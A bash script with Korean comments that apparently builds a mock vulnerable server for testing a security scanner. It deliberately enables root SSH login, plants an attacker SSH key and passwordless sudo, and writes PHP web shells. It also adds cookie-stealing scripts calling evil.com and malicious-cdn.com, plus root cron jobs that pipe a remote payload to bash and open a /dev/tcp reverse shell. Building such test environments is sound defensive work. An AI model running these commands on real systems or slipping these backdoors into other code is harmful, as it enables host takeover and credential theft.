#!/bin/bash
# ============================================================
# 모의 취약 환경 세팅 스크립트 (11개 항목)
# 사용법: sudo bash mock_setup.sh
# ============================================================

echo "=== 모의 취약 환경 세팅 시작 ==="

# 1. sshd_config - root 원격 접속 허용
echo "[1/11] sshd_config - PermitRootLogin yes"
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# 2. SSH 백도어 키 삽입
echo "[2/11] SSH 백도어 키 삽입"
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3FakeKeyForTestingOnly== attacker@evil-server" >> /root/.ssh/authorized_keys

# 3. 계정 잠금 임계값 - PAM 설정 없음 (기본 상태 = 취약)
echo "[3/11] 계정 잠금 - 기본 상태 유지 (취약)"

# 4. sudoers NOPASSWD 설정
echo "[4/11] sudoers NOPASSWD 설정"
echo "ubuntu ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/99-vulnerable
chmod 440 /etc/sudoers.d/99-vulnerable

# 5. auth.log - 가짜 로그인 실패 로그
echo "[5/11] auth.log 가짜 실패 로그 삽입"
for i in $(seq 1 10); do
  echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Failed password for root from 203.0.113.$i port 22 ssh2" >> /var/log/auth.log
done

# 6. 웹셸 샘플
echo "[6/11] 웹셸 샘플 생성"
mkdir -p /var/www/html/uploads
echo '<?php eval(base64_decode($_POST["cmd"])); ?>' > /var/www/html/uploads/cmd.php
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/uploads/backdoor.php

# 7. 민감 파일 노출
echo "[7/11] 민감 파일 생성"
echo 'DB_PASSWORD=supersecret123' > /var/www/html/.env
echo 'db_host=localhost' > /var/www/html/config.bak

# 8. 악성 JavaScript 샘플
echo "[8/11] 악성 JavaScript 샘플 생성"
cat > /var/www/html/infected.html << 'HTMLEOF'
<html>
<head><title>Test Page</title></head>
<body>
<h1>Welcome</h1>
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
</body>
</html>
HTMLEOF

cat > /var/www/html/uploads/tracker.js << 'JSEOF'
var img = new Image();
img.src = "http://malicious-cdn.com/collect?cookie=" + document.cookie;
eval(atob("YWxlcnQoJ3h4cycp"));
JSEOF

# 9. 디렉토리 리스팅 활성화 (Apache)
echo "[9/11] 디렉토리 리스팅 활성화"
if [ -f /etc/apache2/apache2.conf ]; then
  # 기존 -Indexes를 Indexes로 변경
  sed -i 's/Options -Indexes/Options Indexes/g' /etc/apache2/apache2.conf
  sed -i 's/Options -Indexes/Options Indexes/g' /etc/apache2/conf-enabled/security.conf 2>/dev/null
  # Directory 블록에 Indexes 없으면 추가
  if ! grep -q "Options.*Indexes" /etc/apache2/apache2.conf; then
    sed -i '/<Directory \/var\/www\/>/,/<\/Directory>/ s/Options .*/Options Indexes FollowSymLinks/' /etc/apache2/apache2.conf
  fi
  systemctl reload apache2 2>/dev/null
  echo "  Apache Indexes 활성화 완료"
elif [ -f /etc/nginx/nginx.conf ]; then
  # Nginx autoindex on 설정
  sed -i '/location \/ {/a\        autoindex on;' /etc/nginx/sites-enabled/default 2>/dev/null
  systemctl reload nginx 2>/dev/null
  echo "  Nginx autoindex on 활성화 완료"
else
  echo "  Apache/Nginx 설정 파일 없음 - 건너뜀"
fi

# 10. 민감 파일 추가 (backup.sql, .git)
echo "[10/11] 추가 민감 파일 생성"
echo "-- MySQL dump" > /var/www/html/backup.sql
mkdir -p /var/www/html/.git
echo "ref: refs/heads/main" > /var/www/html/.git/HEAD

# 11. crontab 악성 스케줄 삽입
echo "[11/11] crontab 악성 스케줄 삽입"
echo "# AWVS-MOCK-CRON" >> /etc/crontab
echo "*/5 * * * * root curl http://203.0.113.99/payload.sh | bash # AWVS-MOCK-CRON" >> /etc/crontab
echo "0 * * * * root bash -i >& /dev/tcp/203.0.113.99/4444 0>&1 # AWVS-MOCK-CRON" >> /etc/crontab

echo ""
echo "=== 세팅 완료 (11개 항목) ==="
echo "확인:"
grep PermitRootLogin /etc/ssh/sshd_config | head -1
ls -la /var/www/html/uploads/
ls -la /var/www/html/.env /var/www/html/config.bak 2>/dev/null
ls -la /var/www/html/infected.html 2>/dev/null
ls -la /var/www/html/backup.sql /var/www/html/.git/HEAD 2>/dev/null
grep -n "Options.*Indexes" /etc/apache2/apache2.conf 2>/dev/null || grep -n "autoindex" /etc/nginx/sites-enabled/default 2>/dev/null || echo "  웹서버 설정 확인 불가"
grep "AWVS-MOCK-CRON" /etc/crontab 2>/dev/null || echo "  crontab 샘플 없음"
